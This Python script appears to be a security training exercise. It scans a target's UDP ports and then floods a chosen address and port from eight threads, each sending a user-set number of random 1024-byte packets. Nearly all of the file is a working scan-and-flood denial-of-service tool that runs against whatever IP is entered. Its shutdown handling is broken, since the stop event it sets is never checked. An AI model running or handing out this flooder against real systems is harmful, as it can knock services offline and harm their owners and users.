import socket
import threading
import random

shutdown_event = threading.Event()

def send_udp_packets(SRV_ADDR, SRV_PORT, NPACK):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(NPACK):
        data = bytearray(random.getrandbits(8) for _ in range(1024))
        s.sendto(data, (SRV_ADDR, SRV_PORT))
        print(f"Packet {i+1} sent by {threading.current_thread().name}")
    s.close()
    print(f"{threading.current_thread().name} Terminated.")

def port_scan_range(target, lowport, highport, results):
    for port in range(lowport, highport + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.sendto(b'', (target, port))
            data, _ = s.recvfrom(1024)
            results[port] = "OPEN"

        except socket.timeout:
            results[port] = "CLOSED or unresponsive"

        except socket.error as e:
            results[port] = f"Error: {e}"

        finally:
            s.close()

def port_scanner(target, port_range):
    results = {}
    threads = []
    for lowport, highport in port_range:
        thread = threading.Thread(target=port_scan_range, args=(target, lowport, highport, results))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # Print results in numerical order of port
    for port, status in sorted(results.items()):
        print(f"Port {port} on {target} is {status}")

def main():
    print("\033[92m"
      " ____   __   __  _____   _____     ____    _____   ____    _____   _       ____  \n"
      "| __ )  \ \ / / |_   _| | ____|   |  _ \  | ____| | __ )  | ____| | |     / ___| \n"
      "|  _ \   \ V /    | |   |  _|     | |_) | |  _|   |  _ \  |  _|   | |     \___ \ \n"
      "| |_) |   | |     | |   | |___    |  _ <  | |___  | |_) | | |___  | |___   ___) |\n"
      "|____/    |_|     |_|   |_____|   |_| \_\ |_____| |____/  |_____| |_____| |____/ \n"
      "Today's exercise is to write a Python program that simulates an UDP flood,\n"
      "which involves massive sending of UDP requests to a target machine listening\n"
      "on a random UDP port."
      "\033[0m"
    )

    target_ip = input("Enter the IP address of the target to scan: ")
    port_range_str = input("Enter the port range to scan (e.g., 1-100,201-300): ")
    port_ranges = [map(int, port_range.split('-')) for port_range in port_range_str.split(',')]
    
    port_scanner(target_ip, port_ranges)

    SRV_ADDR = input("Enter the address: ")
    SRV_PORT = int(input("Enter the port number: "))
    NPACK = int(input("Enter the number of packets to send: "))
    NUM_THREADS = 8
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=send_udp_packets, args=(SRV_ADDR, SRV_PORT, NPACK), name=f"Thread-{i+1}")
        threads.append(thread)
        thread.start()
    
    print(f"{NUM_THREADS} threads started for sending UDP packets.")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Keyboard interrupt received. Terminating threads...")
        shutdown_event.set() 

    for thread in threads:
        thread.join() 

    print("Program terminated.")

if __name__ == "__main__":
    main()